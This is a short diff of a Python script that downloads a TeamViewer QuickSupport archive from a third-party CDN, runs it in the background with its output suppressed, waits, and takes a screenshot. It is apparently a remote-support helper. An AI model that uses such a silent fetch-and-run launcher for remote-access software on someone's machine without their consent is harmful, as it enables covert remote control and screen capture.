@@ -4,6 +4,8 @@
 import base64
 import os
 import subprocess
+import time
+
 import requests
 
 TEAMVIEWER_URL = "https://cdn.e-nobet.com/app/teamviewer_qs.tar.gz"
@@ -40,7 +42,8 @@ def run_teamviewer():
     if not os.path.exists(teamviewer_path):
         raise FileNotFoundError("Çalıştırılabilir dosya bulunamadı: " + teamviewer_path)
 
-    subprocess.run([teamviewer_path], check=True)
+    # subprocess.run([teamviewer_path], check=True)
+    subprocess.Popen([teamviewer_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 
 def capture_screenshot():
@@ -65,6 +68,7 @@ def main():
     download_teamviewer()
     extract_teamviewer()
     run_teamviewer()
+    time.sleep(5)
     capture_screenshot()
 
 
